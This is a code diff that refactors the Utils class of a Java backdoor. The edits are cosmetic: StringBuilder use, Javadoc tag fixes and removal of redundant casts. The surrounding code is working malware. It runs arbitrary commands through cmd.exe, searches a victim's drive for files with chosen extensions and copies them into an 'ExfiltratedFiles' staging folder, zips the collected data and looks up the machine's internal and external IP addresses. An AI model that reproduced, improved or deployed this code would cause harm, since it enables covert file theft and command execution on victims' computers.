@@ -17,6 +17,7 @@ import java.net.URL;
 import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.Enumeration;
+import java.util.Objects;
 import java.util.zip.ZipEntry;
 import java.util.zip.ZipFile;
 import java.util.zip.ZipOutputStream;
@@ -29,14 +30,14 @@ import org.apache.commons.io.IOUtils;
 public class Utils {
 
 	/**
-	 * Runs command {@link command} in the current machine's command prompt and
+	 * Runs command {@code command} in the current machine's command prompt and
 	 * returns response.
 	 *
 	 * @param command command to run
 	 * @return response from running command
 	 */
 	public static String runCommand(String command) {
-		String resp = "";
+		StringBuilder resp = new StringBuilder();
 		BufferedReader bufferedReader = null;
 		try {
 			ProcessBuilder builder = new ProcessBuilder("cmd.exe", "/c", command);
@@ -45,33 +46,33 @@ public class Utils {
 			while (true) {
 				String line = bufferedReader.readLine();
 				if (line == null) {
-					while (resp.endsWith("\n"))
-						resp = resp.substring(0, resp.length() - 1);
+					while (resp.toString().endsWith("\n"))
+						resp = new StringBuilder(resp.substring(0, resp.length() - 1));
 					break;
 				}
-				resp += line + "\n";
+				resp.append(line).append("\n");
 			}
-			if (resp.isEmpty())
+			if (resp.toString().length() == 0)
 				return "Command did not produce a response";
 			else
-				return resp;
+				return resp.toString();
 		} catch (Exception e) {
-			resp = "An error occurred when trying to run command";
+			resp = new StringBuilder("An error occurred when trying to run command");
 			if (e.getMessage() != null)
-				resp += ":\n" + e.getMessage();
-			return resp;
+				resp.append(":\n").append(e.getMessage());
+			return resp.toString();
 		} finally {
 			try {
 				if (bufferedReader != null)
 					bufferedReader.close();
-			} catch (Exception e) {
+			} catch (Exception ignored) {
 			}
 		}
 	}
 
 	/**
 	 * Uses {@link #runCommand(String)} to run the PowerShell script with the name
-	 * {@link filename}.
+	 * {@code filename}.
 	 *
 	 * @param filename name of script to run
 	 * @return response from running script
@@ -81,7 +82,7 @@ public class Utils {
 	}
 
 	/**
-	 * Copies all files that have extensions in {@link exts} from {@link root} to
+	 * Copies all files that have extensions in {@code exts} from {@code root} to
 	 * {@link Backdoor#gatheredDir}\ExfiltratedFiles'.
 	 *
 	 * @param root directory to copy files from
@@ -91,7 +92,7 @@ public class Utils {
 	public static void exfilFiles(String root, ArrayList<String> exts) throws IOException {
 		new File(Backdoor.gatheredDir + "ExfiltratedFiles").mkdir();
 		for (String ext : exts)
-			for (String file : new ArrayList<String>(
+			for (String file : new ArrayList<>(
 					Arrays.asList(Utils.runCommand("c: && cd " + root + " && dir/b/s/a:-d *." + ext).split("\n"))))
 				if (!file.equals("File Not Found"))
 					FileUtils.copyFile(new File(file), new File(
@@ -99,7 +100,7 @@ public class Utils {
 	}
 
 	/**
-	 * Compresses directory with name {@link dir} to zip file '{@link dir}.zip'.
+	 * Compresses directory with name {@code dir} to zip file '{@code dir}.zip'.
 	 * 
 	 * @param dir name of directory to compress
 	 * @throws IOException
@@ -113,8 +114,8 @@ public class Utils {
 	}
 
 	/**
-	 * Recursively adds the contents of directory {@link rootDir} to the
-	 * ZipOutputStream {@link out}.
+	 * Recursively adds the contents of directory {@code rootDir} to the
+	 * ZipOutputStream {@code out}.
 	 * 
 	 * @param rootDir   root directory
 	 * @param sourceDir source directory
@@ -124,7 +125,7 @@ public class Utils {
 	 */
 	private static void dirToZip(File rootDir, String sourceDir, ZipOutputStream out)
 			throws IOException, FileNotFoundException {
-		for (File file : new File(sourceDir).listFiles()) {
+		for (File file : Objects.requireNonNull(new File(sourceDir).listFiles())) {
 			String fileName = file.getName();
 			if (file.isDirectory())
 				dirToZip(rootDir, sourceDir + File.separator + fileName, out);
@@ -141,10 +142,10 @@ public class Utils {
 	}
 
 	/**
-	 * Decompresses zip file with name {@link zipFileName}.
+	 * Decompresses zip file with name {@code zipFileName}.
 	 * 
 	 * @param zipFileName name of zip file to decompress
-	 * @return directory where contents of zip file with name {@link zipFileName}
+	 * @return directory where contents of zip file with name {@code zipFileName}
 	 *         were copied
 	 * @throws IOException
 	 */
@@ -170,8 +171,8 @@ public class Utils {
 	}
 
 	/**
-	 * If {@link ipType} is "internal", returns the internal IP address of the
-	 * current machine. Otherwise, if {@link ipType} is "external", returns the
+	 * If {@code ipType} is "internal", returns the internal IP address of the
+	 * current machine. Otherwise, if {@code ipType} is "external", returns the
 	 * external IP address of the current machine.
 	 * 
 	 * @param ipType type of IP address to return
@@ -183,15 +184,15 @@ public class Utils {
 		if (ipType.equals("internal")) {
 			Enumeration<NetworkInterface> majorInterfaces = NetworkInterface.getNetworkInterfaces();
 			while (majorInterfaces.hasMoreElements()) {
-				NetworkInterface inter = (NetworkInterface) majorInterfaces.nextElement();
+				NetworkInterface inter = majorInterfaces.nextElement();
 				for (Enumeration<InetAddress> minorInterfaces = inter.getInetAddresses(); minorInterfaces
 						.hasMoreElements();) {
-					InetAddress add = (InetAddress) minorInterfaces.nextElement();
+					InetAddress add = minorInterfaces.nextElement();
 					if (!add.isLoopbackAddress())
-						if (add instanceof Inet4Address)
+						if (add instanceof Inet4Address) {
 							ret = add.getHostAddress();
-						else if (add instanceof Inet6Address)
-							continue;
+							break;
+						}
 				}
 			}
 		} else if (ipType.equals("external")) {
